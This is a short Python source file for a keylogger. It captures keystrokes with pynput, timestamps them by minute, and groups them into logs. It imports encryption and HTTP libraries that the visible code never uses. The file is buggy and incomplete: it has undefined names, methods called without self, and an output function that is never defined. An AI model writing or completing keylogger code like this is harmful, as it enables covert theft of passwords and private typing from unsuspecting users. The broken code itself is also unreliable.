import time
from pynput import *
from pynput.keyboard import *
from cryptography.fernet import Fernet
import os
from requests import request

class KeyLoggerService:
    def __init__(self):
        global_log = []
        log_l = {}
        long_str = ""

    def get_time(self):
        """Get The time by Minutes"""
        current_time_tuple = time.localtime()
        formatted_time = time.strftime("%Y-%m-%d %H:%M", current_time_tuple)
        return formatted_time

    def make_long_str(self):
        """Makes a long str to chek the last characters"""
        global long_str
        if hasattr(self, 'char') and self.char:
            long_str += self.char

    def making_dict(self):
        """Making The directory of the log"""
        global log_l
        now_time = get_time()
        if f"{now_time}" in log_l:
            log_l[f"{now_time}"].append(self)
        else:
            log_l[f"{now_time}"] = [self]


class KeyLoggerManager:
    def __init__(self):
        pass

    def key_for_log(self):
        """Loging Every key to all the function needed"""
        global log_l, long_str, global_log
        make_long_str(self)
        making_dict(self)
        if str_l[-4:] == "exit":
            print("Detected 'exit' key:", list(str_l))
            str_l = ""
        elif self == Key.space:
            global_log.append(log_l)
            log_l = {}
        elif self == Key.esc:
            global_log.append(log_l)
            for i in global_log:
                for j in i:
                    print(f"{j}\n{i[j]} ")
            outing_to_file(global_log)
            return False
